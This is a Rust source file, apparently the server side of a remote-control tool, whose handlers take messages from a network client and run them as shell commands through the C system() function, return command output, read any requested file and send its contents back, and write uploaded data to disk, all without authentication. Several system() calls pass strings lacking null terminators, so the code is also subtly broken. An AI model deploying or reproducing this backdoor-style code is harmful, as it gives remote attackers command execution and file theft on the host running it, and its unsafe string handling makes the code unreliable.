use server;
use messages::*;
use std::fs::File;
use std::fs::remove_file;
use std::io::prelude::*;

extern {
	pub fn system(s: *const u8) -> i32;
}

static HANDLERS: &'static [fn(msg: MessageContainer, client: &mut server::Client) -> bool] = 
	&[ handle_systeme, handle_systeme_dump, handle_file_dump, handle_file_push , handle_exit ];

fn			handle_exit(msg: MessageContainer, client: &mut server::Client) -> bool {
	client.stream.send_message(MessageContainer { id: Response::RequestSuccess as i32, content: msg.content });
	false
}

fn			handle_file_push(msg: MessageContainer, client: &mut server::Client) -> bool {
	if let Ok(res) = File::create(".upl") {
		let mut f = res;
		f.write(msg.content.as_bytes()).expect("[server]Can't write tmp");
		client.stream.send_message(MessageContainer { id: Response::RequestSuccess as i32, content: String::new() });
	}
	else {
		client.stream.send_message(MessageContainer { id: Response::RequestSuccess as i32, content: String::from("Can't create file") });		
	}
	true
}

fn			handle_systeme(msg: MessageContainer, client: &mut server::Client) -> bool {
	unsafe {
		system(msg.content.as_ptr());
	}
	client.stream.send_message(MessageContainer { id: Response::RequestSuccess as i32, content: String::new() });
	true
}

fn			handle_systeme_dump(msg: MessageContainer, client: &mut server::Client) -> bool {
	let tmp = format!("( {} ) > .tmp\0", msg.content);//Yolo
	unsafe {
		system("rm .tmp".as_ptr()); 
		system(tmp.as_ptr()); 
	};
	if let Ok(f) = File::open(".tmp") {
		let mut file_content = String::new();
		let mut reader = f;
		if let Ok(_) = reader.read_to_string(&mut file_content)
		{
			client.stream.send_message(MessageContainer { id: Response::FileDumpResult as i32, content: file_content });
		}
		else {
			client.stream.send_message(MessageContainer { id: Response::RequestFailure as i32, content: String::from("Can't read system result !") });
		}
	}
	else {
		client.stream.send_message(MessageContainer { id: Response::RequestFailure as i32, content: String::from("Can't create dump file !") });
	}
	true
}

pub fn		handle_file_dump(msg: MessageContainer, client: &mut server::Client) -> bool {
	let file = File::open(&msg.content);
	match file {
		Ok(f) => {	
			let mut reader = f;
			let mut file_content = String::new();
			match reader.read_to_string(&mut file_content) {
				Ok(_) => {
					client.stream.send_message(MessageContainer { id: Response::FileDumpResult as i32, content: file_content });
				}
				_ => {
					client.stream.send_message(MessageContainer { id: Response::RequestFailure as i32, content: String::from("Can't read file !") });
				}
			}
		}
		_ => {
			client.stream.send_message(MessageContainer { id: Response::RequestFailure as i32, content: String::from(format!("File dosen't exist : \"{}\" !", msg.content))});
		}
	}
	true
}

pub fn		server_frame(mut client: server::Client){
	loop {
		match client.stream.read_message() {
			Some(msg) => {
				if msg.id >= 0 && msg.id < HANDLERS.len() as i32 && HANDLERS[msg.id as usize](msg, &mut client) == false {
					break ;
				}
			}
			None => break
		}
	}
	//println!("[server]Connection closed !");
}